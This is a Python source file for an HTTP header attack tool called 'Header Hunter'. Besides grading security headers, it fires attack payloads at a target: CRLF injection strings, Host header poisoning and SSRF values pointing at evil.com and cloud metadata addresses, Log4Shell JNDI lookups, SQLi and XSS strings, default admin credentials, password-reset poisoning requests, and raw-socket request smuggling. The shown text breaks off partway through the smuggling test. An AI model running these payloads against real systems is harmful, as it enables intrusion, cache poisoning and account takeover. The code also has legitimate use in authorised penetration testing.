#!/usr/bin/env python3

import argparse
import json
import re
import sys
import socket
import ssl
import time
import hashlib
import copy
from urllib.parse import urlparse, urljoin
from collections import OrderedDict
from datetime import datetime

try:
    import requests
    import urllib3
    from colorama import init, Fore, Style, Back
    from tabulate import tabulate
except ImportError:
    print("Install dependencies: pip install requests urllib3 colorama tabulate")
    sys.exit(1)

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========================= CONSTANTS =========================

SECURITY_HEADERS = {
    "Strict-Transport-Security": {
        "recommended": "max-age=63072000; includeSubDomains; preload",
        "description": "Enforces HTTPS connections",
        "severity": "HIGH",
        "owasp": "Yes"
    },
    "Content-Security-Policy": {
        "recommended": "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'",
        "description": "Controls resources the browser can load",
        "severity": "HIGH",
        "owasp": "Yes"
    },
    "X-Content-Type-Options": {
        "recommended": "nosniff",
        "description": "Prevents MIME type sniffing",
        "severity": "MEDIUM",
        "owasp": "Yes"
    },
    "X-Frame-Options": {
        "recommended": "DENY",
        "description": "Prevents clickjacking via iframes",
        "severity": "HIGH",
        "owasp": "Yes"
    },
    "X-XSS-Protection": {
        "recommended": "0",
        "description": "Legacy XSS filter (disable in favor of CSP)",
        "severity": "LOW",
        "owasp": "Yes"
    },
    "Referrer-Policy": {
        "recommended": "strict-origin-when-cross-origin",
        "description": "Controls referrer information sent with requests",
        "severity": "MEDIUM",
        "owasp": "Yes"
    },
    "Permissions-Policy": {
        "recommended": "accelerometer=(), camera=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=()",
        "description": "Controls browser features and APIs",
        "severity": "MEDIUM",
        "owasp": "Yes"
    },
    "Cross-Origin-Embedder-Policy": {
        "recommended": "require-corp",
        "description": "Prevents loading cross-origin resources without permission",
        "severity": "MEDIUM",
        "owasp": "Yes"
    },
    "Cross-Origin-Opener-Policy": {
        "recommended": "same-origin",
        "description": "Isolates browsing context",
        "severity": "MEDIUM",
        "owasp": "Yes"
    },
    "Cross-Origin-Resource-Policy": {
        "recommended": "same-origin",
        "description": "Prevents cross-origin reads of resources",
        "severity": "MEDIUM",
        "owasp": "Yes"
    },
    "Cache-Control": {
        "recommended": "no-store, no-cache, must-revalidate, private",
        "description": "Controls caching behavior",
        "severity": "MEDIUM",
        "owasp": "Yes"
    },
    "Pragma": {
        "recommended": "no-cache",
        "description": "HTTP/1.0 cache control",
        "severity": "LOW",
        "owasp": "No"
    },
    "X-Permitted-Cross-Domain-Policies": {
        "recommended": "none",
        "description": "Controls Flash/PDF cross-domain access",
        "severity": "LOW",
        "owasp": "Yes"
    },
    "X-DNS-Prefetch-Control": {
        "recommended": "off",
        "description": "Controls DNS prefetching",
        "severity": "LOW",
        "owasp": "No"
    },
    "X-Download-Options": {
        "recommended": "noopen",
        "description": "Prevents IE from opening downloads directly",
        "severity": "LOW",
        "owasp": "No"
    },
    "Expect-CT": {
        "recommended": "max-age=86400, enforce",
        "description": "Certificate Transparency enforcement",
        "severity": "LOW",
        "owasp": "Yes"
    },
    "Feature-Policy": {
        "recommended": "camera 'none'; microphone 'none'; geolocation 'none'",
        "description": "Legacy permissions policy",
        "severity": "LOW",
        "owasp": "No"
    },
    "Access-Control-Allow-Origin": {
        "recommended": "specific-origin (not *)",
        "description": "CORS origin control",
        "severity": "HIGH",
        "owasp": "Yes"
    },
    "Access-Control-Allow-Credentials": {
        "recommended": "false (unless required)",
        "description": "CORS credential control",
        "severity": "HIGH",
        "owasp": "Yes"
    },
    "Access-Control-Allow-Methods": {
        "recommended": "GET, POST (minimal needed)",
        "description": "CORS method restriction",
        "severity": "MEDIUM",
        "owasp": "Yes"
    },
    "Access-Control-Allow-Headers": {
        "recommended": "Content-Type (minimal needed)",
        "description": "CORS header restriction",
        "severity": "MEDIUM",
        "owasp": "Yes"
    },
    "Access-Control-Max-Age": {
        "recommended": "600",
        "description": "CORS preflight cache duration",
        "severity": "LOW",
        "owasp": "No"
    },
    "X-Powered-By": {
        "recommended": "REMOVE",
        "description": "Reveals server technology - information disclosure",
        "severity": "MEDIUM",
        "owasp": "Yes"
    },
    "Server": {
        "recommended": "REMOVE or generic value",
        "description": "Reveals server software - information disclosure",
        "severity": "MEDIUM",
        "owasp": "Yes"
    },
    "X-AspNet-Version": {
        "recommended": "REMOVE",
        "description": "Reveals ASP.NET version - information disclosure",
        "severity": "MEDIUM",
        "owasp": "Yes"
    },
    "X-AspNetMvc-Version": {
        "recommended": "REMOVE",
        "description": "Reveals ASP.NET MVC version - information disclosure",
        "severity": "MEDIUM",
        "owasp": "Yes"
    },
    "X-Runtime": {
        "recommended": "REMOVE",
        "description": "Reveals runtime information",
        "severity": "LOW",
        "owasp": "No"
    },
    "X-Version": {
        "recommended": "REMOVE",
        "description": "Reveals application version",
        "severity": "MEDIUM",
        "owasp": "No"
    },
    "X-Request-Id": {
        "recommended": "Ensure not leaking internal IDs to clients",
        "description": "Request tracking identifier",
        "severity": "LOW",
        "owasp": "No"
    },
    "Set-Cookie": {
        "recommended": "Secure; HttpOnly; SameSite=Strict; Path=/",
        "description": "Cookie security attributes",
        "severity": "HIGH",
        "owasp": "Yes"
    },
    "Content-Type": {
        "recommended": "Include charset (e.g., text/html; charset=UTF-8)",
        "description": "Response content type with charset",
        "severity": "MEDIUM",
        "owasp": "No"
    },
    "X-Content-Security-Policy": {
        "recommended": "Use standard Content-Security-Policy instead",
        "description": "Legacy CSP header",
        "severity": "LOW",
        "owasp": "No"
    },
    "X-WebKit-CSP": {
        "recommended": "Use standard Content-Security-Policy instead",
        "description": "Legacy WebKit CSP header",
        "severity": "LOW",
        "owasp": "No"
    },
    "Clear-Site-Data": {
        "recommended": '"cache", "cookies", "storage"',
        "description": "Clears browsing data on logout pages",
        "severity": "LOW",
        "owasp": "No"
    }
}

INFO_DISCLOSURE_HEADERS = [
    "Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version",
    "X-Runtime", "X-Version", "X-Generator", "X-Drupal-Cache",
    "X-Varnish", "X-Cache", "X-Cache-Hits", "X-Served-By",
    "X-Backend-Server", "X-Debug", "X-Debug-Token", "X-Debug-Token-Link",
    "Via", "X-Amz-Cf-Id", "X-Amz-Cf-Pop", "X-Amz-Request-Id",
    "X-Request-Id", "X-Correlation-Id", "X-Trace-Id"
]

CRLF_PAYLOADS = [
    "%0d%0aInjected-Header:true",
    "%0d%0a%20Injected-Header:true",
    "%0D%0AInjected-Header:true",
    "%0d%0aSet-Cookie:crlf=injected",
    "%0aInjected-Header:true",
    "%0dInjected-Header:true",
    "%23%0d%0aInjected-Header:true",
    "%25%30%61Injected-Header:true",
    "%25%30%64%25%30%61Injected-Header:true",
    "%3f%0d%0aInjected-Header:true",
    "%E5%98%8A%E5%98%8DInjected-Header:true",
    "%%0d0d%%0a0aInjected-Header:true",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a",
    "%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
    "\\r\\nInjected-Header:true",
    "\\r\\n\\r\\n<script>alert(1)</script>",
    "%5cr%5cnInjected-Header:true",
    "%0d%0aLocation:http://evil.com",
    "\r\nInjected-Header:true",
    "\rInjected-Header:true",
    "\nInjected-Header:true",
    "\r\n\r\n<html>injected</html>",
    "%e5%98%8a%e5%98%8dInjected-Header:true",
    "%c4%8d%c4%8aInjected-Header:true",
    "\u000d\u000aInjected-Header:true",
    "%%0a0aInjected-Header:true",
    "%%0d0dInjected-Header:true",
    "%0d%20%0aInjected-Header:true",
    "%0d%09%0aInjected-Header:true",
    "%0d%0a%09Injected-Header:true",
    "%0d%0aInjected-Header:true%0d%0a",
    "%00%0d%0aInjected-Header:true",
    "%0d%0a%00Injected-Header:true",
    "Injected%0d%0aHeader:true",
    "%u000d%u000aInjected-Header:true",
    "\\u000d\\u000aInjected-Header:true",
    "%250d%250aInjected-Header:true",
    "%%250d%%250aInjected-Header:true",
    "%25250d%25250aInjected-Header:true",
    "%0d%0aTransfer-Encoding:chunked",
    "%0d%0aX-Forwarded-For:127.0.0.1",
    "%0d%0aHost:evil.com",
    "%0d%0a%20%20Injected-Header:true",
    "%0d%0a%0d%0aHTTP/1.1 200 OK",
    "\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>pwned</html>",
    "%0d%0aSet-Cookie:crlf=injected;Domain=.target.com",
    "%0d%0aAccess-Control-Allow-Origin:*",
    "%0d%0aX-Forwarded-Host:evil.com",
    "%0d%0aX-Original-URL:/admin",
    "\r\nInjected-Header: true\r\nSecond-Header: also-true",
    "%0d%0aContent-Security-Policy:default-src%20*",
]

HOP_BY_HOP_HEADERS = [
    "Connection", "Keep-Alive", "Proxy-Authenticate", "Proxy-Authorization",
    "TE", "Trailers", "Transfer-Encoding", "Upgrade", "Proxy-Connection",
    "X-Forwarded-For", "X-Forwarded-Host", "X-Forwarded-Proto",
    "X-Real-IP", "X-Original-URL", "X-Rewrite-URL", "X-Custom-IP-Authorization",
    "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr", "X-Client-IP",
    "X-Host", "X-Forwarded-Server", "X-HTTP-Method-Override",
    "X-Method-Override", "X-Original-Method"
]

HOST_HEADER_PAYLOADS = [
    {"type": "duplicate", "header": "Host", "value": "evil.com"},
    {"type": "override", "header": "X-Forwarded-Host", "value": "evil.com"},
    {"type": "override", "header": "X-Host", "value": "evil.com"},
    {"type": "override", "header": "X-Forwarded-Server", "value": "evil.com"},
    {"type": "override", "header": "X-HTTP-Host-Override", "value": "evil.com"},
    {"type": "override", "header": "Forwarded", "value": "host=evil.com"},
    {"type": "override", "header": "X-Original-URL", "value": "/admin"},
    {"type": "override", "header": "X-Rewrite-URL", "value": "/admin"},
    {"type": "port_inject", "header": "Host", "value": "{original_host}:@evil.com"},
    {"type": "port_inject", "header": "Host", "value": "{original_host}:.evil.com"},
    {"type": "subdomain", "header": "Host", "value": "evil.com.{original_host}"},
    {"type": "space_inject", "header": "Host", "value": "{original_host} evil.com"},
    {"type": "tab_inject", "header": "Host", "value": "{original_host}\tevil.com"},
    {"type": "absolute_url", "header": "Host", "value": "evil.com"},
    {"type": "port", "header": "Host", "value": "{original_host}:1337"},
    {"type": "ssrf_localhost", "header": "Host", "value": "127.0.0.1"},
    {"type": "ssrf_internal", "header": "Host", "value": "169.254.169.254"},
    {"type": "ssrf_internal", "header": "Host", "value": "10.0.0.1"},
    {"type": "ssrf_internal", "header": "Host", "value": "[::1]"},
    {"type": "ssrf_internal", "header": "Host", "value": "0x7f000001"},
    {"type": "cache_poison", "header": "X-Forwarded-Host", "value": "evil.com"},
    {"type": "cache_poison", "header": "X-Forwarded-Scheme", "value": "nothttps"},
    {"type": "cache_poison", "header": "X-Forwarded-Proto", "value": "nothttps"},
    {"type": "cache_poison", "header": "X-Original-URL", "value": "/cachepoisontest"},
    {"type": "cache_poison", "header": "X-Forwarded-Prefix", "value": "/cachepoisontest"},
]

HEADER_INJECTION_PAYLOADS = [
    {"header": "X-Forwarded-For", "value": "127.0.0.1", "purpose": "IP spoofing / ACL bypass"},
    {"header": "X-Forwarded-For", "value": "127.0.0.1, 10.0.0.1, 192.168.1.1", "purpose": "Multi-IP spoofing"},
    {"header": "X-Real-IP", "value": "127.0.0.1", "purpose": "IP spoofing"},
    {"header": "X-Client-IP", "value": "127.0.0.1", "purpose": "IP spoofing"},
    {"header": "X-Originating-IP", "value": "127.0.0.1", "purpose": "IP spoofing"},
    {"header": "X-Remote-IP", "value": "127.0.0.1", "purpose": "IP spoofing"},
    {"header": "X-Remote-Addr", "value": "127.0.0.1", "purpose": "IP spoofing"},
    {"header": "X-Custom-IP-Authorization", "value": "127.0.0.1", "purpose": "Auth bypass"},
    {"header": "X-Original-URL", "value": "/admin", "purpose": "URL override"},
    {"header": "X-Rewrite-URL", "value": "/admin", "purpose": "URL override"},
    {"header": "X-HTTP-Method-Override", "value": "PUT", "purpose": "Method override"},
    {"header": "X-Method-Override", "value": "DELETE", "purpose": "Method override"},
    {"header": "X-HTTP-Method", "value": "TRACE", "purpose": "Method override"},
    {"header": "Content-Type", "value": "application/json", "purpose": "Content type manipulation"},
    {"header": "Accept", "value": "application/json", "purpose": "Response format change"},
    {"header": "X-Forwarded-Proto", "value": "https", "purpose": "Protocol override"},
    {"header": "X-Forwarded-Scheme", "value": "https", "purpose": "Scheme override"},
    {"header": "X-Forwarded-Port", "value": "443", "purpose": "Port override"},
    {"header": "Referer", "value": "https://trusted-site.com", "purpose": "Referer spoofing"},
    {"header": "Origin", "value": "https://trusted-site.com", "purpose": "Origin spoofing / CORS"},
    {"header": "X-WAF-Bypass", "value": "1", "purpose": "WAF bypass attempt"},
    {"header": "X-Forwarded-For", "value": "' OR 1=1--", "purpose": "SQLi via header"},
    {"header": "User-Agent", "value": "<script>alert(1)</script>", "purpose": "XSS via header"},
    {"header": "Referer", "value": "<script>alert(1)</script>", "purpose": "XSS via Referer"},
    {"header": "X-Forwarded-For", "value": "${jndi:ldap://evil.com/x}", "purpose": "Log4Shell via header"},
    {"header": "User-Agent", "value": "${jndi:ldap://evil.com/x}", "purpose": "Log4Shell via User-Agent"},
    {"header": "Authorization", "value": "Basic YWRtaW46YWRtaW4=", "purpose": "Default creds admin:admin"},
    {"header": "X-Debug", "value": "1", "purpose": "Debug mode activation"},
    {"header": "X-Debug-Mode", "value": "true", "purpose": "Debug mode activation"},
    {"header": "X-Requested-With", "value": "XMLHttpRequest", "purpose": "AJAX spoofing"},
]


def banner():
    print(f"""{Fore.CYAN}{Style.BRIGHT}
╔═════════════════════════════════════════════════════════════════╗
║                                                                 ║
║        ██╗  ██╗███████╗ █████╗ ██████╗ ███████╗██████╗          ║
║        ██║  ██║██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗         ║
║        ███████║█████╗  ███████║██║  ██║█████╗  ██████╔╝         ║
║        ██╔══██║██╔══╝  ██╔══██║██║  ██║██╔══╝  ██╔══██╗         ║
║        ██║  ██║███████╗██║  ██║██████╔╝███████╗██║  ██║         ║
║        ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝         ║
║                       H U N T E R                               ║
║            Comprehensive HTTP Header Attack Tool                ║
║                     Crafted By ROHIT                            ║
║                                                                 ║
╚═════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}""")


class HeaderHunter:
    def __init__(self, target, timeout=10, threads=5, verbose=False, proxy=None, cookies=None, output_file=None):
        self.target = target if target.startswith("http") else f"https://{target}"
        self.timeout = timeout
        self.verbose = verbose
        self.output_file = output_file
        self.parsed = urlparse(self.target)
        self.original_host = self.parsed.hostname
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        })
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        if cookies:
            for cookie in cookies.split(";"):
                if "=" in cookie:
                    key, val = cookie.strip().split("=", 1)
                    self.session.cookies.set(key.strip(), val.strip())
        self.findings = []
        self.baseline_response = None
        self.baseline_hash = None
        self.baseline_length = None
        self.baseline_status = None

    def log(self, level, message):
        colors = {
            "INFO": Fore.BLUE,
            "PASS": Fore.GREEN,
            "FAIL": Fore.RED,
            "WARN": Fore.YELLOW,
            "VULN": Fore.RED + Style.BRIGHT,
            "DEBUG": Fore.WHITE + Style.DIM,
        }
        color = colors.get(level, Fore.WHITE)
        tag = f"[{level}]"
        line = f"{color}{tag:8s}{Style.RESET_ALL} {message}"
        print(line)
        if level in ("FAIL", "VULN", "WARN"):
            self.findings.append({"level": level, "message": message})

    def get_baseline(self):
        try:
            self.baseline_response = self.session.get(self.target, timeout=self.timeout, allow_redirects=False)
            self.baseline_status = self.baseline_response.status_code
            self.baseline_length = len(self.baseline_response.content)
            self.baseline_hash = hashlib.md5(self.baseline_response.content).hexdigest()
            self.log("INFO", f"Baseline: status={self.baseline_status}, length={self.baseline_length}, hash={self.baseline_hash}")
            return True
        except requests.RequestException as e:
            self.log("FAIL", f"Cannot reach target: {e}")
            return False

    def analyze_security_headers(self):
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"  SECURITY HEADER ANALYSIS")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        if not self.baseline_response:
            if not self.get_baseline():
                return

        resp_headers = self.baseline_response.headers
        results = []
        present_count = 0
        missing_count = 0

        for header_name, info in SECURITY_HEADERS.items():
            header_value = resp_headers.get(header_name)
            status = ""
            detail = ""
            severity = info["severity"]

            if header_name in ("X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version", "Server", "X-Runtime", "X-Version"):
                if header_value:
                    status = "REMOVE"
                    detail = f"Present: {header_value}"
                    self.log("WARN", f"{header_name}: {header_value} (information disclosure)")
                    missing_count += 1
                else:
                    status = "OK"
                    detail = "Not present (good)"
                    present_count += 1
            elif header_name == "Set-Cookie":
                cookies_in_resp = resp_headers.get("Set-Cookie", "")
                if cookies_in_resp:
                    issues = []
                    if "secure" not in cookies_in_resp.lower():
                        issues.append("Missing Secure flag")
                    if "httponly" not in cookies_in_resp.lower():
                        issues.append("Missing HttpOnly flag")
                    if "samesite" not in cookies_in_resp.lower():
                        issues.append("Missing SameSite attribute")
                    if issues:
                        status = "WEAK"
                        detail = "; ".join(issues)
                        self.log("WARN", f"Set-Cookie issues: {detail}")
                        missing_count += 1
                    else:
                        status = "OK"
                        detail = "Cookie flags properly set"
                        present_count += 1
                else:
                    status = "N/A"
                    detail = "No cookies set"
                    present_count += 1
            elif header_name == "Access-Control-Allow-Origin":
                if header_value:
                    if header_value == "*":
                        status = "WEAK"
                        detail = f"Wildcard origin: {header_value}"
                        self.log("WARN", f"CORS wildcard origin detected")
                        missing_count += 1
                    elif header_value == "null":
                        status = "WEAK"
                        detail = "null origin allowed"
                        self.log("WARN", f"CORS null origin allowed")
                        missing_count += 1
                    else:
                        status = "OK"
                        detail = f"Set to: {header_value}"
                        present_count += 1
                else:
                    status = "N/A"
                    detail = "Not set (may be fine if no CORS needed)"
                    present_count += 1
            elif header_name == "Access-Control-Allow-Credentials":
                acac = header_value
                acao = resp_headers.get("Access-Control-Allow-Origin", "")
                if acac and acac.lower() == "true" and acao == "*":
                    status = "VULN"
                    detail = "Credentials with wildcard origin"
                    self.log("VULN", "CORS: Allow-Credentials with wildcard origin!")
                    missing_count += 1
                elif acac:
                    status = "INFO"
                    detail = f"Set to: {acac}"
                    present_count += 1
                else:
                    status = "N/A"
                    detail = "Not set"
                    present_count += 1
            elif header_name == "Content-Security-Policy":
                if header_value:
                    csp_issues = self._analyze_csp(header_value)
                    if csp_issues:
                        status = "WEAK"
                        detail = "; ".join(csp_issues[:3])
                        for issue in csp_issues:
                            self.log("WARN", f"CSP issue: {issue}")
                        missing_count += 1
                    else:
                        status = "OK"
                        detail = "CSP appears well-configured"
                        present_count += 1
                else:
                    status = "MISSING"
                    detail = "No CSP header"
                    self.log("FAIL", f"Missing {header_name}: {info['description']}")
                    missing_count += 1
            else:
                if header_value:
                    status = "OK"
                    detail = f"Set to: {header_value[:60]}"
                    present_count += 1
                else:
                    status = "MISSING"
                    detail = f"Recommended: {info['recommended'][:60]}"
                    self.log("FAIL", f"Missing {header_name}: {info['description']}")
                    missing_count += 1

            status_color = {
                "OK": Fore.GREEN, "MISSING": Fore.RED, "WEAK": Fore.YELLOW,
                "REMOVE": Fore.YELLOW, "N/A": Fore.WHITE, "VULN": Fore.RED + Style.BRIGHT,
                "INFO": Fore.BLUE
            }.get(status, Fore.WHITE)

            results.append([
                header_name[:35],
                f"{status_color}{status}{Style.RESET_ALL}",
                severity,
                detail[:55]
            ])

        print(tabulate(results, headers=["Header", "Status", "Severity", "Details"], tablefmt="grid"))

        score = (present_count / (present_count + missing_count)) * 100 if (present_count + missing_count) > 0 else 0
        grade = "A+" if score >= 95 else "A" if score >= 90 else "B" if score >= 80 else "C" if score >= 70 else "D" if score >= 60 else "F"
        grade_color = Fore.GREEN if score >= 80 else Fore.YELLOW if score >= 60 else Fore.RED
        print(f"\n{grade_color}Security Header Score: {score:.1f}% (Grade: {grade}){Style.RESET_ALL}")
        print(f"  Present/Good: {Fore.GREEN}{present_count}{Style.RESET_ALL}  Missing/Weak: {Fore.RED}{missing_count}{Style.RESET_ALL}")

        self._check_info_disclosure_headers()

    def _analyze_csp(self, csp):
        issues = []
        if "'unsafe-inline'" in csp:
            issues.append("unsafe-inline allows inline scripts/styles")
        if "'unsafe-eval'" in csp:
            issues.append("unsafe-eval allows eval()")
        if "data:" in csp:
            issues.append("data: URI scheme allowed")
        if "*" in csp.split() or "* " in csp:
            issues.append("Wildcard source allowed")
        if "default-src" not in csp:
            issues.append("No default-src directive")
        if "script-src" not in csp and "default-src 'none'" not in csp:
            issues.append("No script-src directive")
        if "frame-ancestors" not in csp:
            issues.append("No frame-ancestors (clickjacking)")
        if "base-uri" not in csp:
            issues.append("No base-uri directive")
        if "form-action" not in csp:
            issues.append("No form-action directive")
        if "http:" in csp:
            issues.append("HTTP source allowed in CSP")
        if "blob:" in csp:
            issues.append("blob: URI scheme allowed")
        return issues

    def _check_info_disclosure_headers(self):
        print(f"\n{Fore.CYAN}  Information Disclosure Headers:{Style.RESET_ALL}")
        found_any = False
        for header in INFO_DISCLOSURE_HEADERS:
            value = self.baseline_response.headers.get(header)
            if value:
                self.log("WARN", f"Information disclosure: {header}: {value}")
                found_any = True
        if not found_any:
            self.log("PASS", "No significant information disclosure headers found")

    def test_crlf_injection(self):
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"  CRLF INJECTION TESTING ({len(CRLF_PAYLOADS)} payloads)")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        vulnerable_count = 0
        for i, payload in enumerate(CRLF_PAYLOADS, 1):
            try:
                test_url = f"{self.target}/{payload}"
                resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)

                injected = False
                if "Injected-Header" in str(resp.headers):
                    injected = True
                if "crlf=injected" in resp.headers.get("Set-Cookie", ""):
                    injected = True
                for h_name, h_val in resp.headers.items():
                    if "injected" in h_name.lower() or "injected" in h_val.lower():
                        injected = True
                        break

                if injected:
                    self.log("VULN", f"CRLF injection confirmed with payload #{i}: {payload[:60]}")
                    vulnerable_count += 1
                elif self.verbose:
                    self.log("DEBUG", f"Payload #{i}: not vulnerable")

            except requests.RequestException:
                if self.verbose:
                    self.log("DEBUG", f"Payload #{i}: connection error")
                continue

            if i % 10 == 0 and not self.verbose:
                print(f"  Progress: {i}/{len(CRLF_PAYLOADS)} payloads tested...", end="\r")

        print(f"  {'':60}")
        if vulnerable_count == 0:
            self.log("PASS", "No CRLF injection vulnerabilities found")
        else:
            self.log("VULN", f"Found {vulnerable_count} CRLF injection vectors!")

    def test_host_header_attacks(self):
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"  HOST HEADER ATTACK TESTING")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        if not self.baseline_response:
            if not self.get_baseline():
                return

        for payload_info in HOST_HEADER_PAYLOADS:
            ptype = payload_info["type"]
            header = payload_info["header"]
            value = payload_info["value"].replace("{original_host}", self.original_host)

            try:
                headers = {}
                if header == "Host" and ptype not in ("override",):
                    headers["Host"] = value
                else:
                    headers[header] = value

                resp = self.session.get(self.target, headers=headers, timeout=self.timeout, allow_redirects=False)

                is_suspicious = False
                reason = ""

                if "evil.com" in resp.text:
                    is_suspicious = True
                    reason = "evil.com reflected in response body"
                if "evil.com" in str(resp.headers):
                    is_suspicious = True
                    reason = "evil.com reflected in response headers"

                location = resp.headers.get("Location", "")
                if "evil.com" in location:
                    is_suspicious = True
                    reason = f"evil.com in redirect Location: {location}"

                if ptype == "ssrf_localhost" and resp.status_code == 200:
                    resp_hash = hashlib.md5(resp.content).hexdigest()
                    if resp_hash != self.baseline_hash and resp.status_code != self.baseline_status:
                        is_suspicious = True
                        reason = f"Different response with localhost Host (status={resp.status_code})"

                if ptype == "ssrf_internal" and resp.status_code == 200:
                    if "metadata" in resp.text.lower() or "ami-id" in resp.text.lower() or "instance" in resp.text.lower():
                        is_suspicious = True
                        reason = "Possible cloud metadata access via SSRF"

                if ptype in ("cache_poison",):
                    if value in resp.text or value in str(resp.headers):
                        is_suspicious = True
                        reason = f"Cache poisoning vector reflected via {header}"

                if resp.status_code != self.baseline_status and ptype in ("port_inject", "subdomain", "space_inject", "tab_inject"):
                    is_suspicious = True
                    reason = f"Status code changed: {self.baseline_status} -> {resp.status_code}"

                if is_suspicious:
                    self.log("VULN", f"Host header attack [{ptype}]: {header}: {value} - {reason}")
                elif self.verbose:
                    self.log("DEBUG", f"[{ptype}] {header}: {value} - status={resp.status_code}")

            except requests.RequestException as e:
                if self.verbose:
                    self.log("DEBUG", f"Error testing {header}: {value} - {e}")

        self._test_password_reset_poisoning()

    def _test_password_reset_poisoning(self):
        print(f"\n{Fore.YELLOW}  Password Reset Poisoning Test:{Style.RESET_ALL}")
        common_reset_paths = [
            "/password/reset", "/reset-password", "/forgot-password",
            "/api/password/reset", "/api/auth/forgot-password",
            "/users/password/new", "/account/forgot-password",
            "/auth/reset", "/login/forgot", "/wp-login.php?action=lostpassword"
        ]

        for path in common_reset_paths:
            url = f"{self.target.rstrip('/')}{path}"
            try:
                resp_get = self.session.get(url, timeout=self.timeout, allow_redirects=True)
                if resp_get.status_code in (200, 302, 301):
                    self.log("INFO", f"Reset endpoint found: {path} (status={resp_get.status_code})")

                    poison_headers = {
                        "Host": "evil.com",
                        "X-Forwarded-Host": "evil.com"
                    }
                    try:
                        resp_poison = self.session.post(
                            url,
                            headers=poison_headers,
                            data={"email": "test@test.com", "username": "test"},
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                        if "evil.com" in resp_poison.text or "evil.com" in str(resp_poison.headers):
                            self.log("VULN", f"Password reset poisoning possible at {path}!")
                    except requests.RequestException:
                        pass
            except requests.RequestException:
                continue

    def test_request_header_injection(self):
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"  REQUEST HEADER INJECTION TESTING")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        if not self.baseline_response:
            if not self.get_baseline():
                return

        for payload_info in HEADER_INJECTION_PAYLOADS:
            header = payload_info["header"]
            value = payload_info["value"]
            purpose = payload_info["purpose"]

            try:
                headers = {header: value}
                resp = self.session.get(self.target, headers=headers, timeout=self.timeout, allow_redirects=False)

                interesting = False
                reason = ""

                if resp.status_code != self.baseline_status:
                    interesting = True
                    reason = f"Status changed: {self.baseline_status}->{resp.status_code}"

                resp_len = len(resp.content)
                if self.baseline_length and abs(resp_len - self.baseline_length) > (self.baseline_length * 0.2):
                    interesting = True
                    reason += f" Size diff: {self.baseline_length}->{resp_len}"

                if value in resp.text:
                    interesting = True
                    reason += " Value reflected in response"

                if header in ("X-Forwarded-For", "X-Real-IP", "X-Client-IP") and "127.0.0.1" in resp.text:
                    if "127.0.0.1" not in (self.baseline_response.text if self.baseline_response else ""):
                        interesting = True
                        reason += " IP reflected (possible spoofing)"

                if header in ("X-Original-URL", "X-Rewrite-URL") and resp.status_code in (200, 403):
                    if resp.status_code != self.baseline_status:
                        interesting = True
                        reason += " URL override may be working"

                if interesting:
                    self.log("WARN", f"Header injection [{purpose}]: {header}: {value} - {reason.strip()}")
                elif self.verbose:
                    self.log("DEBUG", f"[{purpose}] {header}: {value} - No effect")

            except requests.RequestException as e:
                if self.verbose:
                    self.log("DEBUG", f"Error: {header}: {value} - {e}")

    def test_request_smuggling(self):
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"  REQUEST SMUGGLING DETECTION")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        parsed = urlparse(self.target)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_ssl = parsed.scheme == "https"
        path = parsed.path or "/"

        self._test_clte_smuggling(host, port, use_ssl, path)
        self._test_tecl_smuggling(host, port, use_ssl, path)
        self._test_tete_smuggling(host, port, use_ssl, path)

    def _send_raw(self, host, port, use_ssl, raw_request, recv_timeout=5):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(recv_timeout)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            sock.connect((host, port))
            sock.sendall(raw_request.encode("utf-8", errors="replace"))
            response = b""
            start_time = time.time()
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
                if time.time() - start_time > recv_timeout:
                    break
            sock.close()
            return response.decode("utf-8", errors="replace"), time.time() - start_time
        except Exception as e:
            return None, 0

    def _test_clte_smuggling(self, host, port, use_ssl, path):
        self.log("INFO", "Testing CL.TE smuggling...")

        normal_request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"\r\n"
            f"normal"
        )
        normal_resp, normal_time = self._send_raw(host, port, use_ssl, normal_request)

        smuggle_request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\n"
            f"Z\r\n"
            f"Q\r\n"
            f"\r\n"
        )
